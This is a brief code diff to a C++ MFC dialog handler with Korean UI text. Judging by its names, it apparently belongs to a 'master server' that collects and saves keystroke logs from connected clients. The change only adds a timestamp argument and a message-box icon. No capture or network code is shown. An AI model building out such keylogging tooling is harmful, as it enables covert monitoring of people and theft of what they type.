@@ -269,7 +269,7 @@ void CNotepadMasterServerDlg::OnBnClickedButtonSaveGlobalKeylogs()
 {
 	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
 	for (int i = 0; i < m_client_list.size(); i++)
-		m_client_list[i]->SaveKeylogs();
+		m_client_list[i]->SaveKeylogs(CTime::GetCurrentTime().GetTime());
 
-	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK);
+	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK | MB_ICONINFORMATION);
 }
